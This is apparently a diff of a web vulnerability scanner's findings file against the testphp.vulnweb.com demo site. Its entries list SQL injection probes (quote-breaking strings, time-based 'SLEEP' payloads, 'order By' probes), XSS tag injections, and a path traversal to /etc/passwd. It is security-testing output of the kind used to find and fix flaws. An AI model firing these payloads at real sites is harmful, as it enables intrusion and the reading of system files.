@@ -1,14 +1,14 @@
 
 [vuln]
 Method:GET
-Url:http://testphp.vulnweb.com/artists.php?artist=1鎈'"\(
+Url:http://testphp.vulnweb.com/AJAX/infoartist.php?id=1鎈'"\(
 Vuln_type:sqli
 Level:high
 
 
 [vuln]
 Method:GET
-Url:http://testphp.vulnweb.com/artists.php?artist=1 AND SLEEP(2)
+Url:http://testphp.vulnweb.com/artists.php?artist=1鎈'"\(
 Vuln_type:sqli
 Level:high
 
@@ -22,6 +22,20 @@ Level:middle
 
 [vuln]
 Method:GET
+Url:http://testphp.vulnweb.com/AJAX/infocateg.php?id=1鎈'"\(
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg鎈'"\(&amp;size=160
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
 Url:http://testphp.vulnweb.com/listproducts.php?cat=1 order By 500 
 Vuln_type:sqli
 Level:high
@@ -29,21 +43,78 @@ Level:high
 
 [vuln]
 Method:GET
-Url:http://testphp.vulnweb.com/listproducts.php?cat=1 AND SLEEP(2)
+Url:http://testphp.vulnweb.com/listproducts.php?artist=</div><arcbvyf>
+Vuln_type:xss
+Level:middle
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/showimage.php?file=</><arcbvyf>&amp;size=160
+Vuln_type:xss
+Level:middle
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/listproducts.php?artist=1 order By 500 
 Vuln_type:sqli
 Level:high
 
 
 [vuln]
 Method:GET
-Url:http://testphp.vulnweb.com/AJAX/infoartist.php?id=1鎈'"\(
+Url:http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg鎈'"\(&size=160
 Vuln_type:sqli
 Level:high
 
 
 [vuln]
 Method:GET
-Url:http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 AND SLEEP(2)
+Url:http://testphp.vulnweb.com/showimage.php?file=../../../../../../../../../../../etc/passwd&size=160
+Vuln_type:file_read
+Level:middle
+
+
+[vuln report]
+Method:POST
+Url:http://testphp.vulnweb.com/secured/newuser.php
+Body:{'uuname': ['admin鎈\'"\\('], 'upass': ['roefgujv'], 'upass2': ['oulvxhuc'], 'urname': ['admin'], 'ucc': ['1'], 'uemail': ['example@example.com'], 'uphone': ['13012345678'], 'uaddress': ['rock street'], 'signup': ['signup']}
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/hpp/params.php?p=</><arcbvyf>&amp;pp=12
+Vuln_type:xss
+Level:middle
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/hpp/params.php?p=</><arcbvyf>&pp=12
+Vuln_type:xss
+Level:middle
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/artists.php?artist=1 AND SLEEP(5)
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 AND SLEEP(5)
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/listproducts.php?cat=1 AND SLEEP(5)
 Vuln_type:sqli
 Level:high
 
